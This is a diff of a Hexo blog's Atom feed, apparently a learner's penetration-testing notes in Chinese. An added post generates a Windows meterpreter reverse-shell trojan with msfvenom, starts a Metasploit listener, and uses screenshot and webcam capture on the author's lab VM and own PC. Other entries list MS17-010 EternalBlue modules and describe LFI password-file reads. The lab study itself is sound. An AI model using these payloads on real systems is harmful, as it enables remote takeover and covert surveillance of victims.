@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-06-01T12:55:29.877Z</updated>
+  <updated>2020-06-07T08:35:43.462Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,55 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>msfvenom简单应用</title>
+    <link href="http://yoursite.com/2020/06/07/msfvenom%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/"/>
+    <id>http://yoursite.com/2020/06/07/msfvenom%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/</id>
+    <published>2020-06-07T08:02:28.000Z</published>
+    <updated>2020-06-07T08:35:43.462Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前期设置"><a href="#前期设置" class="headerlink" title="前期设置"></a>前期设置</h4><p>攻击者：kali ip:192.168.78.128</p><p>目标靶机：win7(虚拟机)，win10（本机）</p><h5 id="1-msfvenom-生成木马脚本test1-exe"><a href="#1-msfvenom-生成木马脚本test1-exe" class="headerlink" title="1.msfvenom 生成木马脚本test1.exe"></a>1.msfvenom 生成木马脚本test1.exe</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.78.128 lport=4444 -f exe &gt;test1.exe</span><br></pre></td></tr></table></figure><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200607162126.png" alt=""></p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200607162530.png" alt=""></p><h5 id="2-msfconsole监听"><a href="#2-msfconsole监听" class="headerlink" title="2.msfconsole监听"></a>2.msfconsole监听</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 198.168.78.128</span><br><span class="line">lhost =&gt; 198.168.78.128</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport</span><br><span class="line">[-] Unknown variable</span><br><span class="line">Usage: set [option] [value]</span><br><span class="line"></span><br><span class="line">Set the given option to value.  If value is omitted, print the current value.</span><br><span class="line">If both are omitted, print options that are currently set.</span><br><span class="line"></span><br><span class="line">If run from a module context, this will set the value in the module's</span><br><span class="line">datastore.  Use -g to operate on the global datastore</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200607162925.png" alt=""></p><h5 id="对win7使用screenshot；"><a href="#对win7使用screenshot；" class="headerlink" title="对win7使用screenshot；"></a>对win7使用screenshot；</h5><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200607163131.png" alt=""></p><h5 id="对win10使用webcam"><a href="#对win10使用webcam" class="headerlink" title="对win10使用webcam;"></a>对win10使用webcam;</h5><p><img src="/images/1591518880554.png" alt="1591518880554"></p><p>最简单的木马攻击，实际上很难，免杀，防火墙，都是要突破的问题；</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;前期设置&quot;&gt;&lt;a href=&quot;#前期设置&quot; class=&quot;headerlink&quot; title=&quot;前期设置&quot;&gt;&lt;/a&gt;前期设置&lt;/h4&gt;&lt;p&gt;攻击者：kali ip:192.168.78.128&lt;/p&gt;
+&lt;p&gt;目标靶机：win7(虚拟机)，win10（本机）&lt;/p&gt;
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="msf" scheme="http://yoursite.com/tags/msf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>msf-总结</title>
+    <link href="http://yoursite.com/2020/06/07/msf-%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2020/06/07/msf-%E6%80%BB%E7%BB%93/</id>
+    <published>2020-06-07T03:57:21.000Z</published>
+    <updated>2020-06-07T08:04:35.226Z</updated>
+    
+    <content type="html"><![CDATA[<h5 id="msf攻击使用过的模块"><a href="#msf攻击使用过的模块" class="headerlink" title="msf攻击使用过的模块"></a>msf攻击使用过的模块</h5><h6 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17_010"></a>ms17_010</h6><p>探测：scanner/smb/smb_ms17_010</p><p>smb/msf_010_psexec</p><p>监听模块：</p><p>payload:</p><p>ms17_010_eternalblue;</p><p>Metasploit渗透测试魔鬼训练营</p><p>msf session操作</p><p>sessions -l -i ;</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h5 id=&quot;msf攻击使用过的模块&quot;&gt;&lt;a href=&quot;#msf攻击使用过的模块&quot; class=&quot;headerlink&quot; title=&quot;msf攻击使用过的模块&quot;&gt;&lt;/a&gt;msf攻击使用过的模块&lt;/h5&gt;&lt;h6 id=&quot;ms17-010&quot;&gt;&lt;a href=&quot;#ms17-010&quot;
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>6.1sql注入原理+sqlmap再学学习</title>
@@ -146,11 +195,11 @@
   </entry>
   
   <entry>
-    <title>new life for future - linux再回顾</title>
+    <title>linux再回顾</title>
     <link href="http://yoursite.com/2020/04/27/new-life-for-future-linux%E5%86%8D%E5%9B%9E%E9%A1%BE/"/>
     <id>http://yoursite.com/2020/04/27/new-life-for-future-linux%E5%86%8D%E5%9B%9E%E9%A1%BE/</id>
     <published>2020-04-27T15:03:29.000Z</published>
-    <updated>2020-04-27T15:03:29.429Z</updated>
+    <updated>2020-06-07T08:04:34.650Z</updated>
     
     <summary type="html">
     
@@ -431,62 +480,6 @@
     </summary>
     
     
-    
-  </entry>
-  
-  <entry>
-    <title>3.22-本地文件上传漏洞（LFI）</title>
-    <link href="http://yoursite.com/2020/03/22/3.22-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88LFI%EF%BC%89/"/>
-    <id>http://yoursite.com/2020/03/22/3.22-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88LFI%EF%BC%89/</id>
-    <published>2020-03-21T16:36:04.000Z</published>
-    <updated>2020-03-24T11:36:12.427Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/wh4am1/p/6542398.html" target="_blank" rel="noopener">https://www.cnblogs.com/wh4am1/p/6542398.html</a></p><p>在基本的LFI攻击中，我们可以使用（../）或简单地（/）从目录中直接<a href="https://www.secpulse.com/archives/tag/读取文件" target="_blank" rel="noopener">读取文件</a>的内容，下面的截图中在浏览器URL中访问密码文件。</p><p>在一些情况下，由于高安全级别，上面提到的基本本地文件包含攻击可能不工作。从下面的截图可以观察到，当在URL中执行相同的路径时，却无法读取密码文件。 所以当面对这样的问题，可以进行NULL byte攻击。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wh4am1/p/6542398.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/wh4am1/p/6542398.html&lt;/a&gt;&lt;
-      
-    
-    </summary>
-    
-    
-      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
-    
-    
-      <category term="upload" scheme="http://yoursite.com/tags/upload/"/>
-    
-      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>3.21-渗透靶机-acid</title>
-    <link href="http://yoursite.com/2020/03/21/3.21-%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA-acid/"/>
-    <id>http://yoursite.com/2020/03/21/3.21-%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA-acid/</id>
-    <published>2020-03-21T14:59:50.000Z</published>
-    <updated>2020-03-21T15:00:24.587Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/105462?from=timeline" target="_blank" rel="noopener">https://www.anquanke.com/post/id/105462?from=timeline</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/105462?from=timeline&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/105462?fr
-      
-    
-    </summary>
-    
-    
-      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="靶机" scheme="http://yoursite.com/tags/%E9%9D%B6%E6%9C%BA/"/>
-    
-      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
